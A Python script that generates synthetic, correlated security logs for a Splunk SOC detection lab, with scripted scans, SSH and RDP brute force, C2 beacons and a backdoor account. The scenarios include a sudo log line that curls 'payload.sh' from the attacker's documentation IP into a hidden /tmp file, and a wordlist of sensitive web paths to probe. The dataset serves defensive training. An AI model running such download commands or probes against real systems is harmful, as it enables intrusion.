#!/usr/bin/env python3
"""
Synthetic dataset generator for the Splunk SOC detection lab.

Produces five correlated log sources covering 7 days (2025-06-01 -> 2025-06-07,
timezone +0200):

  raw/apache.log            web access log          (sourcetype: access_combined)
  raw/secure.log            Linux sshd/sudo auth    (sourcetype: linux_secure)
  raw/windows_security.csv  Windows Security events (sourcetype: winsec_csv)
  raw/dns.log               Zeek-style DNS, TSV     (sourcetype: dns_tsv)
  raw/firewall.log          firewall, CSV           (sourcetype: firewall_csv)

Everything is synthetic. All external IP addresses are taken from the
documentation ranges reserved by RFC 5737 (192.0.2.0/24, 198.51.100.0/24,
203.0.113.0/24); internal hosts use RFC 1918 space. No real IP, user or
credential is used.

Usage:
    python generate_dataset.py                   # writes to ./raw
    python generate_dataset.py --out DIR         # custom output directory
    python generate_dataset.py --classic-syslog  # legacy "Jun  1 03:00:29"
                                                 # timestamps (no year, no tz)

The output is reproducible: noise uses random.seed(42) and the attack
scenarios use a dedicated generator (random.Random(7)), so changing the noise
volume never moves the attack timeline.
"""

import argparse
import csv
import random
import re
import sys
from collections import defaultdict
from datetime import datetime, timedelta, timezone
from pathlib import Path

random.seed(42)          # background noise
SCN = random.Random(7)   # attack scenarios (independent stream)

# ---------------------------------------------------------------------------
# GENERAL CONFIGURATION
# ---------------------------------------------------------------------------

START_DATE = datetime(2025, 6, 1, 0, 0, 0)
NUM_DAYS = 7
TZ_OFFSET = "+0200"          # CEST in June (e.g. Europe/Paris)
TZ_OFFSET_COLON = "+02:00"

# --- Hosts and addresses ----------------------------------------------------

INTERNAL_WORKSTATIONS = [f"192.168.1.{i}" for i in range(20, 60)]
INTERNAL_SERVERS = [f"10.0.0.{i}" for i in range(10, 25)]
RESOLVER_IP = "10.0.0.2"
WEB01_IP = "192.168.1.15"        # exposed Linux web server  (SSH / Apache victim)
WINDC01_IP = "192.168.1.10"      # Windows domain controller (RDP victim)
NOISY_DNS_HOST = "192.168.1.47"  # workstation producing benign-but-suspicious DNS noise

# Attacker addresses (RFC 5737 documentation ranges)
MAL_IP_SCANNER = "198.51.100.23"   # web directory scan + port scan
MAL_IP_SSH_BRUTE = "203.0.113.50"  # SSH brute force -> web01 compromise -> C2
MAL_IP_RDP_BRUTE = "203.0.113.77"  # RDP brute force -> WINDC01 compromise
MAL_IP_MISC = "198.51.100.99"      # low-volume recon: HEAD requests + failed SSH, never succeeds

# Legitimate external clients (RFC 5737, TEST-NET-1)
NORMAL_PUBLIC_IPS = [f"192.0.2.{i}" for i in random.sample(range(1, 255), 150)]

# --- Accounts and domains ---------------------------------------------------

LEGIT_USERS = ["jdupont", "mtremblay", "asmith", "lgarcia", "kwilson",
               "cbernard", "pnguyen", "rmartin", "sfoster", "tlefevre"]
LINUX_ADMINS = ["admin", "root"]
WIN_ADMINS = ["administrator", "admin", "svc_admin"]
FALSE_POSITIVE_USER = "mtremblay"   # mistypes the password 3 times, then succeeds
BACKDOOR_USER = "svc_backup"        # account created by the attacker (persistence)

MAL_DOMAINS = ["malware.xyz", "c2server.top", "phishing-bank.info", "evil-update.net"]
NORMAL_DOMAINS = ["google.com", "microsoft.com", "github.com", "office365.com",
                  "wikipedia.org", "cloudflare.com", "linkedin.com", "slack.com",
                  "zoom.us", "aws.amazon.com", "adobe.com", "dropbox.com",
                  "intra.corp.local", "mail.corp.local", "portal.corp.local"]

USER_AGENTS_NORMAL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
]

NORMAL_URIS = [
    ("/", "GET"), ("/index.html", "GET"), ("/about.html", "GET"),
    ("/products", "GET"), ("/products/item?id=42", "GET"),
    ("/contact", "GET"), ("/login", "GET"), ("/login", "POST"),
    ("/api/v1/status", "GET"), ("/images/logo.png", "GET"),
    ("/css/style.css", "GET"), ("/js/app.js", "GET"),
    ("/cart", "GET"), ("/checkout", "POST"), ("/search?q=shoes", "GET"),
    ("/blog/2025-tips", "GET"), ("/favicon.ico", "GET"),
]

# Wordlist used by the scanner (typical directory-brute-force targets)
SUSPICIOUS_URIS = [
    "/wp-admin/", "/wp-login.php", "/phpmyadmin/", "/phpmyadmin/index.php",
    "/.env", "/config.php", "/admin/config.php", "/.git/config",
    "/xmlrpc.php", "/administrator/", "/wp-content/plugins/",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/backup.zip", "/db.sql", "/server-status", "/.htaccess", "/.DS_Store",
    "/test.php", "/shell.php", "/uploads/", "/cgi-bin/", "/console",
    "/actuator/env", "/phpinfo.php", "/old/", "/dev/", "/staging/",
    "/.svn/entries", "/wp-config.php.bak", "/admin/login", "/manager/html",
    "/solr/admin/",
]

SYSLOG_CLASSIC = False   # set from the command line
STATE = {}               # shared scenario timeline (filled by the generators)

# ---------------------------------------------------------------------------
# HELPERS
# ---------------------------------------------------------------------------

def daterange_days():
    return [START_DATE + timedelta(days=d) for d in range(NUM_DAYS)]


def random_time_in_day(day, business_hours=True):
    if business_hours and random.random() < 0.75:
        hour = random.randint(8, 18)
    else:
        hour = random.randint(0, 23)
    return day.replace(hour=hour, minute=random.randint(0, 59), second=random.randint(0, 59))


def apache_time(dt):
    return dt.strftime(f"%d/%b/%Y:%H:%M:%S {TZ_OFFSET}")


def syslog_time(dt):
    if SYSLOG_CLASSIC:  # "Jun  1 08:23:11": no year, no timezone
        return f"{dt.strftime('%b')} {dt.day:2d} {dt.strftime('%H:%M:%S')}"
    # rsyslog RSYSLOG_FileFormat style: ISO 8601 with timezone
    return dt.strftime("%Y-%m-%dT%H:%M:%S.000000") + TZ_OFFSET_COLON


def iso_time(dt):
    return dt.strftime(f"%Y-%m-%dT%H:%M:%S{TZ_OFFSET}")


def epoch(dt):
    """Epoch seconds for a naive local datetime, interpreted explicitly as
    TZ_OFFSET. (dt.timestamp() would silently use the timezone of the machine
    running the script and shift the DNS log against the other sources.)"""
    tz = timezone(timedelta(hours=int(TZ_OFFSET[1:3]) * (1 if TZ_OFFSET[0] == "+" else -1)))
    return dt.replace(tzinfo=tz).timestamp()


def seq_times(base, n, lo, hi):
    """n strictly increasing timestamps starting at `base`, with random gaps in
    [lo, hi] seconds. (The first dataset version redrew a multiplier on each
    iteration, which produced out-of-order events.)"""
    t, out = base, []
    for _ in range(n):
        out.append(t)
        t = t + timedelta(seconds=SCN.randint(lo, hi))
    return out


def write_sorted(path, rows, header=None):
    rows.sort(key=lambda x: x[0])
    with open(path, "w", newline="", encoding="utf-8") as f:
        if header:
            f.write(header + "\n")
        for _, line in rows:
            f.write(line + "\n")


# ---------------------------------------------------------------------------
# 1. APACHE ACCESS LOG
# ---------------------------------------------------------------------------

def generate_apache(out):
    lines = []
    for day in daterange_days():
        # normal traffic
        for _ in range(random.randint(90, 140)):
            ts = random_time_in_day(day)
            ip = random.choice(NORMAL_PUBLIC_IPS + INTERNAL_WORKSTATIONS)
            uri, method = random.choice(NORMAL_URIS)
            status = random.choices([200, 301, 302, 404, 400, 500],
                                    weights=[78, 5, 5, 7, 3, 2])[0]
            user = "-" if random.random() > 0.15 else random.choice(LEGIT_USERS)
            referer = random.choice(["-", "https://www.example.com/", "-"])
            ua = random.choice(USER_AGENTS_NORMAL)
            lines.append((ts, f'{ip} - {user} [{apache_time(ts)}] "{method} {uri} HTTP/1.1" '
                              f'{status} {random.randint(200, 45000)} "{referer}" "{ua}"'))

        # Scenario: directory scan on June 2 and 3 (2 passes over the wordlist)
        if day.day in (2, 3):
            base = day.replace(hour=SCN.randint(1, 4), minute=SCN.randint(0, 30))
            wordlist = SUSPICIOUS_URIS * 2
            for ts, uri in zip(seq_times(base, len(wordlist), 1, 3), wordlist):
                status = SCN.choices([404, 403, 200], weights=[75, 20, 5])[0]
                ua = SCN.choice(["-", "curl/7.88.1", "python-requests/2.31.0", "-"])
                lines.append((ts, f'{MAL_IP_SCANNER} - - [{apache_time(ts)}] "GET {uri} HTTP/1.1" '
                                  f'{status} {SCN.randint(150, 900)} "-" "{ua}"'))

            # Borderline recon: slow HEAD requests, empty user-agent, fewer than 20 hits
            base2 = day.replace(hour=SCN.randint(2, 5), minute=SCN.randint(0, 45))
            for ts in seq_times(base2, 15, 5, 20):
                uri = SCN.choice(SUSPICIOUS_URIS)
                lines.append((ts, f'{MAL_IP_MISC} - - [{apache_time(ts)}] "HEAD {uri} HTTP/1.1" '
                                  f'404 0 "-" "-"'))
    write_sorted(out / "apache.log", lines)
    return len(lines)


# ---------------------------------------------------------------------------
# 2. LINUX AUTH LOG
# ---------------------------------------------------------------------------

def generate_secure(out):
    lines = []
    for day in daterange_days():
        pid_base = random.randint(10000, 30000)

        # normal internal SSH activity
        for _ in range(random.randint(60, 90)):
            ts = random_time_in_day(day)
            user = random.choice(LEGIT_USERS + LINUX_ADMINS)
            src = random.choice(INTERNAL_WORKSTATIONS + INTERNAL_SERVERS)
            pid = pid_base + random.randint(1, 9999)
            verb = "Accepted" if random.random() < 0.9 else "Failed"
            lines.append((ts, f"{syslog_time(ts)} web01 sshd[{pid}]: {verb} password for {user} "
                              f"from {src} port {random.randint(30000, 60000)} ssh2"))
            if random.random() < 0.25:  # occasional sudo
                ts2 = ts + timedelta(seconds=random.randint(5, 120))
                cmd = random.choice(["/bin/ls", "/usr/bin/systemctl restart apache2",
                                     "/bin/cat /var/log/syslog", "/usr/bin/apt update"])
                if random.random() < 0.85:
                    l2 = (f"{syslog_time(ts2)} web01 sudo: {user} : TTY=pts/0 ; "
                          f"PWD=/home/{user} ; USER=root ; COMMAND={cmd}")
                else:
                    l2 = (f"{syslog_time(ts2)} web01 sudo: {user} : 3 incorrect password attempts ; "
                          f"TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}")
                lines.append((ts2, l2))

        # False positive: legitimate user mistypes 3 times, then succeeds
        fp_base = random_time_in_day(day)
        fp_src = random.choice(INTERNAL_WORKSTATIONS)
        for i in range(3):
            ts = fp_base + timedelta(seconds=i * 8)
            lines.append((ts, f"{syslog_time(ts)} web01 sshd[{pid_base + 100 + i}]: Failed password for "
                              f"{FALSE_POSITIVE_USER} from {fp_src} port {random.randint(30000, 60000)} ssh2"))
        ts_ok = fp_base + timedelta(seconds=35)
        lines.append((ts_ok, f"{syslog_time(ts_ok)} web01 sshd[{pid_base + 103}]: Accepted password for "
                             f"{FALSE_POSITIVE_USER} from {fp_src} port {random.randint(30000, 60000)} ssh2"))

        # Background noise: generic invalid-user probes from ordinary external clients
        for _ in range(random.randint(10, 25)):
            ts = random_time_in_day(day, business_hours=False)
            fake_user = random.choice(["test", "guest", "oracle", "postgres", "ftpuser", "www"])
            lines.append((ts, f"{syslog_time(ts)} web01 sshd[{pid_base + random.randint(1, 9999)}]: "
                              f"Invalid user {fake_user} from {random.choice(NORMAL_PUBLIC_IPS)} "
                              f"port {random.randint(30000, 60000)} ssh2"))

        # Scenario 1: SSH brute force -> success -> post-compromise command (June 3)
        if day.day == 3:
            base = day.replace(hour=2, minute=12, second=0)
            n = SCN.randint(45, 70)
            times = seq_times(base, n, 3, 8)
            for i, ts in enumerate(times):
                target = SCN.choice(["root", "admin", "web01", "test", "oracle"])
                who = target if target in LEGIT_USERS + LINUX_ADMINS else f"invalid user {target}"
                lines.append((ts, f"{syslog_time(ts)} web01 sshd[{pid_base + 500 + i}]: Failed password for "
                                  f"{who} from {MAL_IP_SSH_BRUTE} port {SCN.randint(30000, 60000)} ssh2"))
            ts_compromise = times[-1] + timedelta(seconds=SCN.randint(5, 15))
            lines.append((ts_compromise, f"{syslog_time(ts_compromise)} web01 sshd[{pid_base + 900}]: "
                                         f"Accepted password for root from {MAL_IP_SSH_BRUTE} "
                                         f"port {SCN.randint(30000, 60000)} ssh2"))
            ts_action = ts_compromise + timedelta(seconds=45)
            lines.append((ts_action, f"{syslog_time(ts_action)} web01 sudo: root : TTY=pts/1 ; PWD=/root ; "
                                     f"USER=root ; COMMAND=/usr/bin/curl -s "
                                     f"http://{MAL_IP_SSH_BRUTE}/payload.sh -o /tmp/.x.sh"))
            STATE["ssh_compromise_ts"] = ts_compromise

        # Scenario 3: failed-only SSH brute force (no success) on June 6
        if day.day == 6:
            base = day.replace(hour=14, minute=SCN.randint(0, 40), second=0)
            for ts in seq_times(base, 30, 10, 25):
                target = SCN.choice(["root", "admin", "test"])
                who = target if target in LINUX_ADMINS else f"invalid user {target}"
                lines.append((ts, f"{syslog_time(ts)} web01 sshd[{pid_base + 700 + SCN.randint(0, 99)}]: "
                                  f"Failed password for {who} from {MAL_IP_MISC} "
                                  f"port {SCN.randint(30000, 60000)} ssh2"))
    write_sorted(out / "secure.log", lines)
    return len(lines)


# ---------------------------------------------------------------------------
# 3. WINDOWS SECURITY EVENTS (CSV)
# ---------------------------------------------------------------------------

def generate_windows(out):
    rows = []
    for day in daterange_days():
        for _ in range(random.randint(70, 100)):
            ts = random_time_in_day(day)
            user = random.choice(LEGIT_USERS)
            src = random.choice(INTERNAL_WORKSTATIONS)
            ltype = random.choice([2, 3, 10])  # interactive, network, RDP
            rows.append((ts, f"{iso_time(ts)},4624,{user},{src},{ltype},WINDC01"))
            if random.random() < 0.08:         # occasional benign failure
                ts2 = ts + timedelta(seconds=random.randint(2, 30))
                rows.append((ts2, f"{iso_time(ts2)},4625,{user},{src},{ltype},WINDC01"))

        for _ in range(random.randint(8, 15)):  # benign special-privilege logons
            ts = random_time_in_day(day)
            rows.append((ts, f"{iso_time(ts)},4672,{random.choice(WIN_ADMINS)},"
                             f"{random.choice(INTERNAL_SERVERS)},2,WINDC01"))

        # Scenario 2: RDP brute force -> lockout -> success -> privileges -> new account (June 5)
        if day.day == 5:
            base = day.replace(hour=3, minute=5, second=0)
            n = SCN.randint(40, 65)
            times = seq_times(base, n, 4, 9)
            for ts in times:
                target = SCN.choice(["administrator", "admin", "backup", "svc_sql"])
                rows.append((ts, f"{iso_time(ts)},4625,{target},{MAL_IP_RDP_BRUTE},10,WINDC01"))
            ts_lock = times[int(n * 0.6)] + timedelta(seconds=1)
            rows.append((ts_lock, f"{iso_time(ts_lock)},4740,administrator,{MAL_IP_RDP_BRUTE},10,WINDC01"))
            ts_ok = times[-1] + timedelta(seconds=SCN.randint(30, 60))
            ts_priv = ts_ok + timedelta(seconds=20)
            ts_create = ts_ok + timedelta(seconds=90)
            rows.append((ts_ok, f"{iso_time(ts_ok)},4624,svc_sql,{MAL_IP_RDP_BRUTE},10,WINDC01"))
            rows.append((ts_priv, f"{iso_time(ts_priv)},4672,svc_sql,{MAL_IP_RDP_BRUTE},10,WINDC01"))
            rows.append((ts_create, f"{iso_time(ts_create)},4720,{BACKDOOR_USER},{MAL_IP_RDP_BRUTE},10,WINDC01"))
            STATE["rdp_attempt_times"] = times
            STATE["rdp_success_ts"] = ts_ok
    write_sorted(out / "windows_security.csv", rows,
                 header="timestamp,EventCode,Account_Name,src_ip,Logon_Type,ComputerName")
    return len(rows)


# ---------------------------------------------------------------------------
# 4. DNS LOG (Zeek-style TSV)
# ---------------------------------------------------------------------------

def _beacon_schedule():
    """C2 beacon on web01 after the compromise (June 3 and June 4).
    A NOERROR answer is followed by a firewall ALLOW connection."""
    if "beacons" in STATE:
        return STATE["beacons"]
    plan = []
    day4 = START_DATE.replace(day=4)
    start3 = STATE["ssh_compromise_ts"] + timedelta(minutes=10)
    start4 = day4.replace(hour=SCN.randint(2, 6), minute=SCN.randint(0, 50))
    for start, domain in ((start3, "evil-update.net"), (start4, "malware.xyz")):
        t = start
        for _ in range(SCN.randint(20, 30)):
            rcode = SCN.choices(["NOERROR", "NXDOMAIN"], weights=[70, 30])[0]
            plan.append((t, domain, rcode))
            t = t + timedelta(minutes=SCN.randint(3, 8))
    STATE["beacons"] = plan
    return plan


def generate_dns(out):
    lines = []
    for day in daterange_days():
        for _ in range(random.randint(140, 180)):
            ts = random_time_in_day(day)
            src = random.choice(INTERNAL_WORKSTATIONS + INTERNAL_SERVERS)
            qtype = random.choices(["A", "AAAA", "TXT", "NS"], weights=[70, 15, 10, 5])[0]
            lines.append((ts, f"{epoch(ts):.6f}\t{src}\t{RESOLVER_IP}\t{random.choice(NORMAL_DOMAINS)}\t"
                              f"{qtype}\tNOERROR\t{random.choice(NORMAL_PUBLIC_IPS)}"))
        # Benign-but-suspicious noise: an unrelated workstation hits suspicious domains (NXDOMAIN)
        if SCN.random() < 0.5:
            for _ in range(SCN.randint(1, 3)):
                ts = random_time_in_day(day, business_hours=True)
                d = SCN.choice(["phishing-bank.info", "c2server.top"])
                lines.append((ts, f"{epoch(ts):.6f}\t{NOISY_DNS_HOST}\t{RESOLVER_IP}\t{d}\tA\tNXDOMAIN\t-"))
    for ts, domain, rcode in _beacon_schedule():
        answer = MAL_IP_SSH_BRUTE if rcode == "NOERROR" else "-"
        lines.append((ts, f"{epoch(ts):.6f}\t{WEB01_IP}\t{RESOLVER_IP}\t{domain}\tA\t{rcode}\t{answer}"))
    write_sorted(out / "dns.log", lines, header="#ts\tsrc_ip\tdest_ip\tquery\tqtype\trcode\tanswers")
    return len(lines)


# ---------------------------------------------------------------------------
# 5. FIREWALL LOG (CSV)
# ---------------------------------------------------------------------------

def generate_firewall(out):
    rows = []

    def add(ts, src, dst, sport, dport, action, proto="TCP"):
        rows.append((ts, f"{iso_time(ts)},{src},{dst},{sport},{dport},{action},{proto}"))

    for day in daterange_days():
        for _ in range(random.randint(100, 150)):  # normal outbound traffic
            ts = random_time_in_day(day)
            dport = random.choice([443, 443, 443, 80, 53, 22, 3389])
            add(ts, random.choice(INTERNAL_WORKSTATIONS + INTERNAL_SERVERS),
                random.choice(NORMAL_PUBLIC_IPS), random.randint(1024, 65000), dport,
                "ALLOW", "UDP" if dport == 53 else "TCP")
        for _ in range(random.randint(10, 20)):    # routine DENY (policy), unrelated to attacks
            ts = random_time_in_day(day)
            add(ts, random.choice(INTERNAL_WORKSTATIONS), random.choice(NORMAL_PUBLIC_IPS),
                random.randint(1024, 65000), random.choice([25, 445, 135]), "DENY")

        # Scenario: port scan against web01 (June 2)
        if day.day == 2:
            base = day.replace(hour=1, minute=SCN.randint(0, 40))
            ports = SCN.sample(range(1, 65000), SCN.randint(80, 150))
            for ts, p in zip(seq_times(base, len(ports), 1, 4), ports):
                add(ts, MAL_IP_SCANNER, WEB01_IP, SCN.randint(1024, 65000), p, "DROP")

    # C2 connections: one ALLOW per successful beacon resolution
    for ts, domain, rcode in _beacon_schedule():
        if rcode == "NOERROR":
            add(ts + timedelta(seconds=1), WEB01_IP, MAL_IP_SSH_BRUTE,
                SCN.randint(1024, 65000), 443, "ALLOW")

    # RDP connections matching each Windows attempt (+ the successful one)
    for ts in STATE["rdp_attempt_times"] + [STATE["rdp_success_ts"]]:
        add(ts, MAL_IP_RDP_BRUTE, WINDC01_IP, SCN.randint(1024, 65000), 3389, "ALLOW")

    write_sorted(out / "firewall.log", rows,
                 header="timestamp,src_ip,dest_ip,src_port,dest_port,action,protocol")
    return len(rows)


# ---------------------------------------------------------------------------
# SELF-CHECK: invariants the detections rely on (reads the written files)
# ---------------------------------------------------------------------------

def verify(out):
    errors = []

    def check(cond, msg):
        if not cond:
            errors.append(msg)

    # SSH: attacker has many failures then a success, in chronological order
    ssh = []
    pat = re.compile(r"\S+ web01 sshd\[\d+\]: (Failed|Accepted) password for (?:invalid user )?\S+ from (\S+)")
    for line in open(out / "secure.log", encoding="utf-8"):
        m = pat.search(line)
        if m:
            ssh.append((m[2], m[1]))
    fails = defaultdict(int)
    for ip, verb in ssh:
        fails[ip] += (verb == "Failed")
    check(fails[MAL_IP_SSH_BRUTE] >= 45, "SSH brute force too small")
    check(fails[MAL_IP_MISC] == 30, "failed-only brute force should have 30 failures")
    attacker_events = [v for ip, v in ssh if ip == MAL_IP_SSH_BRUTE]
    check(attacker_events and attacker_events[-1] == "Accepted",
          "SSH success must be the attacker's last auth event")

    # Firewall: the scanner is the only DROP source and hits >= 80 distinct ports
    ports = defaultdict(set)
    for r in csv.DictReader(open(out / "firewall.log", newline="")):
        if r["action"] == "DROP":
            ports[r["src_ip"]].add(r["dest_port"])
    check(list(ports) == [MAL_IP_SCANNER] and len(ports[MAL_IP_SCANNER]) >= 80,
          "port scan invariant failed")

    # Windows: chain 4625* -> 4624 -> 4672 -> 4720 from the same IP, in order
    chain = [(r["EventCode"], r["Account_Name"]) for r in
             csv.DictReader(open(out / "windows_security.csv", newline=""))
             if r["src_ip"] == MAL_IP_RDP_BRUTE]
    check([c for c, _ in chain][-3:] == ["4624", "4672", "4720"], "Windows chain order invalid")
    check(sum(1 for c, a in chain if c == "4625" and a == "svc_sql") >= 5, "too few svc_sql failures")

    # All four malicious domains appear in dns.log
    dns = open(out / "dns.log", encoding="utf-8").read()
    for d in MAL_DOMAINS:
        check(d in dns, f"{d} missing from dns.log")

    if errors:
        print("VERIFICATION FAILED:\n  - " + "\n  - ".join(errors))
        sys.exit(1)
    print("Verification passed (scenario invariants hold).")


# ---------------------------------------------------------------------------
# MAIN
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--out", default=str(Path(__file__).resolve().parent / "raw"),
                    help="output directory (default: ./raw next to this script)")
    ap.add_argument("--classic-syslog", action="store_true",
                    help='write secure.log with classic "Jun  1 03:00:29" timestamps (no year, no tz)')
    args = ap.parse_args()
    SYSLOG_CLASSIC = args.classic_syslog

    out_dir = Path(args.out)
    out_dir.mkdir(parents=True, exist_ok=True)

    counts = {}
    counts["apache.log"] = generate_apache(out_dir)
    counts["secure.log"] = generate_secure(out_dir)
    counts["windows_security.csv"] = generate_windows(out_dir)
    counts["dns.log"] = generate_dns(out_dir)              # needs the SSH compromise time
    counts["firewall.log"] = generate_firewall(out_dir)    # needs beacons + RDP timeline

    print(f"Dataset written to {out_dir}")
    for name, n in counts.items():
        print(f"  {name}: {n} events")
    verify(out_dir)
